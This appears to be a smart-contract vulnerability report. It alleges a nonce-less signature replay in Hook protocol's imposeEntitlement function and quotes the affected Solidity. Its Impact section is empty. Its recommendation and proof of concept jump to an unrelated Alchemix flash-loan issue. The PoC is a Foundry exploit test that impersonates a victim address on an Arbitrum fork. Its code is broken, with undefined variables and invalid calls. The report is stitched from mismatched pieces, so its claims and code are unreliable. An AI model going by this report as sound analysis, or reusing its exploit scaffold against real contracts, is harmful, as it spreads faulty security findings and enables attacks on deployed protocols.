Once entitlement is imposed, its signature can be reused again to reverse the effect of entitlement clearing.

## Bug Description
`HookERC721MultiVaultImplV1.imposeEntitlement()` is prone to signature replay attack that same signature can be reused time and again until expiry time.

Signature does not contain nonce to invalidate once used one.

If asset's operator has given asset's operator clears settlement by calling `HookERC721MultiVaultImplV1.clearEntitlement()`, it can be reversed by calling `HookERC721MultiVaultImplV1.imposeEntitlement()` again with same signature.

https://github.com/hookart/protocol/blob/main/src/HookERC721MultiVaultImplV1.sol#L118-L132
```solidity
    function imposeEntitlement(address operator, uint32 expiry, uint32 assetId, uint8 v, bytes32 r, bytes32 s)
        public
        virtual
    {
        // check that the asset has a current beneficial owner
        // before creating a new entitlement
        require(
            assets[assetId].beneficialOwner != address(0),
            "imposeEntitlement-beneficial owner must be set to impose an entitlement"
        );

        // the beneficial owner of an asset is able to set any entitlement on their own asset
        // as long as it has not already been committed to someone else.
        _verifyAndRegisterEntitlement(operator, expiry, assetId, v, r, s);
    }
```

https://github.com/hookart/protocol/blob/main/src/HookERC721MultiVaultImplV1.sol#L348-L373
```solidity
    function validateEntitlementSignature(
        address operator,
        uint32 expiry,
        uint32 assetId,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public view {
        bytes32 entitlementHash = _getEIP712Hash(
            Entitlements.getEntitlementStructHash(
                Entitlements.Entitlement({
                    beneficialOwner: assets[assetId].beneficialOwner,
                    expiry: expiry,
                    operator: operator,
                    assetId: assetId,
                    vaultAddress: address(this)
                })
            )
        );
        address signer = ecrecover(entitlementHash, v, r, s);

        require(signer != address(0), "recovered address is null");
        require(
            signer == assets[assetId].beneficialOwner, "validateEntitlementSignature --- not signed by beneficialOwner"
        );
    }
```

## Impact


## Risk Breakdown
Difficulty to Exploit: Medium
Weakness: Medium
CVSS2 Score: 6.5

## Recommendation

Should include following ERC3156 standard and spendAllowance given by the user before buring token.

https://github.com/radiant-capital/v2/blob/main/contracts/lending/libraries/logic/ValidationLogic.sol

```solidity
https://github.com/alchemix-finance/v2-foundry/blob/master/src/AlchemicTokenV2.sol#L232
```solidity
  function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
  ) external override nonReentrant returns (bool) {
	...

    uint256 fee = flashFee(token, amount);

    _mint(address(receiver), amount);

    if (receiver.onFlashLoan(msg.sender, token, amount, fee, data) != CALLBACK_SUCCESS) {
      revert IllegalState();
    }

    _burn(address(receiver), amount + fee); // Will throw error if not enough to burn

    return true;
  }
```

## References
https://github.com/alchemix-finance/v2-foundry/blob/master/src/AlchemicTokenV2.sol#L232
https://github.com/alchemix-finance/v2-foundry/blob/master/src/AlchemicTokenV2Base.sol#L231
https://eips.ethereum.org/EIPS/eip-3156#flash-lending-security-considerations

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface IAlchemixTokenV2 is IERC20 {
	function flashFee(address token, uint256 amount) external view returns (uint256 fee);
	function flashLoan(
		IERC3156FlashBorrower receiver,
		address token,
		uint256 amount,
		bytes calldata data
	) external returns (bool success);
}


contract AlchemixTokenV2Exploit is Test {

    IAlchemixTokenV2 alcx = IAlchemixTokenV2(0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address victim =  0xDA63F22BF4bDC0B88536bDf4375fc9E14862ABD8;
	uint256 amount = 1 ether;

    function setUp() public {
        cheats.createSelectFork("arbitrum", 95144404);
        deal(address(this), 0);
    }

    function testExp() external {
        vm.startPrank(victim);

        uint256 _fee = alcx.flashFee(amount);
        uint256 _repayment = amount + _fee;
        IERC20(token).increaseAllowance(address(alcx), _repayment);

        console.log("Flashloan...");
        lender.flashLoan(this, token, amount, data);
		console.log("Approval after Flashloan - " + alcx.allowance(victim, alcx));
    }
}
```